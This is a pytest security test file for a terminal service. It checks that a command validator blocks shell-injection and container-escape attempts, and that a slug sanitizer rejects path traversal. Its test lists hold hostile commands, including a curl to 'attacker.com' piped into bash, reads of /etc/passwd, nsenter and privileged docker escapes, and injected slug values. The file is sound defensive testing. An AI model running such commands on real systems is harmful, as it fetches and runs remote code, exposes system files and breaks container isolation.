# tests/security/test_security_constraints.py
"""
Security-focused tests for the terminal service.

These tests validate that the security controls collectively prevent:
- Command injection via operator chaining
- Container breakout attempts
- Slug injection/path traversal into the WebSocket route
- Unwhitelisted access
"""

import os
import sys
import unittest.mock as m

import pytest
from fastapi import HTTPException

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
os.environ.setdefault('REDIS_URL', 'redis://localhost:6379')
for mod in ['redis', 'pexpect', 'boto3', 'psutil', 'aiohttp']:
    if mod not in sys.modules:
        sys.modules[mod] = m.MagicMock()

import main
from main import sanitize_project_slug, validate_command

# ─────────────────────────────────────────────────────────────────────────────
# Injection attack surface
# ─────────────────────────────────────────────────────────────────────────────

INJECTION_VECTORS = [
    # classic shell injection — non-echo prefix so blocklist fires
    "ls; cat /etc/passwd",
    "ls && curl attacker.com",
    "ls || python3 -c 'import os; os.system(\"id\")'",
    "ls | tee /tmp/out",
    "ls > /tmp/out",
    "cat < /dev/null",
    "ls `id`",
    "ls $(whoami)",
    # command chaining with whitespace tricks
    "ls ;id",
    "ls;id",
    # subshell not prefixed with an allowlisted command
    "$(curl http://attacker.com/shell.sh | bash)",
    # NOTE: 'echo x > /tmp/x', 'echo `id`', 'echo $(whoami)' are currently
    # ALLOWED by the permissive ^echo\s+.*$ allowlist pattern.  They are
    # documented as known gaps in test_command_validator.TestSecurityObservations.
]

@pytest.mark.parametrize("cmd", INJECTION_VECTORS)
def test_injection_vector_blocked(cmd):
    assert validate_command(cmd) is False, f"Injection '{cmd}' should be blocked"


# ─────────────────────────────────────────────────────────────────────────────
# Container escape surface
# ─────────────────────────────────────────────────────────────────────────────

ESCAPE_VECTORS = [
    "docker run --privileged -v /:/host ubuntu chroot /host",
    "kubectl exec -it pod -- /bin/bash",
    "sudo su -",
    "nsenter --target 1 --mount --uts --ipc --net --pid",
    "unshare --pid --fork bash",
    "mount --bind / /mnt",
    "chroot / bash",
]

@pytest.mark.parametrize("cmd", ESCAPE_VECTORS)
def test_container_escape_blocked(cmd):
    assert validate_command(cmd) is False, f"Escape '{cmd}' should be blocked"


# ─────────────────────────────────────────────────────────────────────────────
# Slug injection — must not reach the file system
# ─────────────────────────────────────────────────────────────────────────────

MALICIOUS_SLUGS = [
    "../etc/passwd",
    "../../root",
    "minishell/../../../etc",
    "/absolute/path",
    "slug;id",
    "slug$(id)",
    "slug\x00null",
    "not-whitelisted",
    "admin",
    "root",
]

@pytest.fixture
def demo_set():
    """F4-01: seed the DB-driven whitelist snapshot (no network in tests)."""
    saved = (main.demo_whitelist.slugs, main.demo_whitelist.last_sync)
    main.demo_whitelist.slugs = {'minishell', 'push_swap', 'philosophers'}
    try:
        yield main.demo_whitelist.slugs
    finally:
        main.demo_whitelist.slugs, main.demo_whitelist.last_sync = saved


@pytest.mark.parametrize("slug", MALICIOUS_SLUGS)
def test_malicious_slug_rejected(slug, demo_set):
    with pytest.raises(HTTPException):
        sanitize_project_slug(slug)


# ─────────────────────────────────────────────────────────────────────────────
# Whitelisted slugs must all pass sanitization
# ─────────────────────────────────────────────────────────────────────────────

ALLOWED_SLUGS = [
    'minishell', 'push_swap', 'philosophers',
]

@pytest.mark.parametrize("slug", ALLOWED_SLUGS)
def test_allowed_slug_passes(slug, demo_set):
    result = sanitize_project_slug(slug)
    assert result == slug
